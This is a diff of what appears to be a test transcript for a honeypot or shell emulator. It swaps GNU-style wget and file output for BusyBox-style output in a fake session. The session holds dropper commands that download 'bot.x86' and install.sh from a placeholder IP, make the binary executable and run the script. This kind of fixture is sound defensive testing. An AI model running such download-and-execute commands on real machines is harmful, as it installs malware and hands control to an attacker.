@@ -1,24 +1,19 @@
 // Nothing is ever fetched: a placeholder file is written instead.
 $ cd /tmp; wget http://198.51.100.7/bot.x86
---2026-11-17 12:00:00--  http://198.51.100.7/bot.x86
-Resolving 198.51.100.7 (198.51.100.7)... 198.51.100.7
-Connecting to 198.51.100.7 (198.51.100.7)|198.51.100.7|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 27416 (27K) [application/octet-stream]
-Saving to: ‘bot.x86’
-
-bot.x86              100%[===================>]     27K  81K/s    in 0.4s   
-
-2026-11-17 12:00:01 (81K/s) - ‘bot.x86’ saved [27416/27416]
+Connecting to 198.51.100.7 (198.51.100.7:80)
+saving to 'bot.x86'
+bot.x86              100% |********************************| 43427  0:00:00 ETA
+'bot.x86' saved
 
 
 
 $ ls -l /tmp/bot.x86; file /tmp/bot.x86
--rw-r--r-- 1 root root 27416 Nov 17 12:00 /tmp/bot.x86
-/tmp/bot.x86: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3f1e0a4f2b8c6e2d7a9b1c0d5e4f3a2b1c0d9e8f, for GNU/Linux 3.2.0, stripped
+-rw-r--r-- 1 root root 43427 Nov 17 12:00 /tmp/bot.x86
+sh: file: not found
+[exit 127]
 $ chmod +x bot.x86; ./bot.x86
-Segmentation fault (core dumped)
-[exit 139]
+./bot.x86: line 1: syntax error: unexpected "("
+[exit 2]
 $ wget -q http://198.51.100.7/install.sh -O /tmp/i.sh && cat /tmp/i.sh && sh /tmp/i.sh; echo $?
 #!/bin/sh
 0
